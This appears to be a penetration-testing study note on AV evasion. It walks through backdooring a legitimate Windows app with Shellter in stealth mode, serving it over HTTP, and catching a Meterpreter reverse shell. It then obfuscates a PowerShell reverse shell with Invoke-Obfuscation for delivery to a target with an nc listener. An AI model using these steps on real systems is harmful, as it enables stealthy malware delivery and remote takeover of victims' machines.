---
title: 'Obfuscation'
description: 'Evasion with Shellter, obfuscation PowerShell Code.'
pubDate: 'May 12 2023'
slug: 'trip/obfuscation'
---

- **_Obfuscation:_** Reorganizes code in order to make it harcer to analyze or RE.

- **_Encoding:_** Is a process involving changing data into a new format using a scheme. Enconding is a reversible process; data can be encoded to a new format and decoded to its original format.

- **_Packing:_** Generate executables with new binary structure with a smaller size and therefore provides the payload with a new signature.

- **_Crypters:_** Encrypts code or payloads and decrypts the encrypted code in memory. The decryption key/function is usually stored in a stub.

```bash
apt install shellter -y

# Add 32 architecture
dpkg --add-architecture i386

apt install wine32

# Its gonna replace origin app thats why we create new one
# Create a copy of viewwer windows app

cd /usr/share/windows-resources/shellter/

wine shellter.exe
# select 1
# stealth mode? y
# select payload 5
# select port, host

# listening a server on pwd of app
python3 -m http.server 80

# METASPLOIT
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST
set PORT

# EXECUTE app on windows and get a reverse shell.
```

***PowerShell Code Obfuscation.***

```bash
# PayloadAllTheThings

git clone https://github.com/danielbohannon/Invoke-Obfuscation.git

# Example with this file
Import-Module ./Invoke-Obfuscation.psd1
cd ..
Invoke-Obfuscation

# Copy a powershell reverse-shell from payloadallthethings

SET SCRIPTPATH /home/printer/pwsh.ps1
# obfuscation all the ast nodes
AST
ALL
1
# Transfer payload to target
# and set up a listener nc
```

- [Ip converter](https://www.silisoftware.com/tools/ipconverter.php)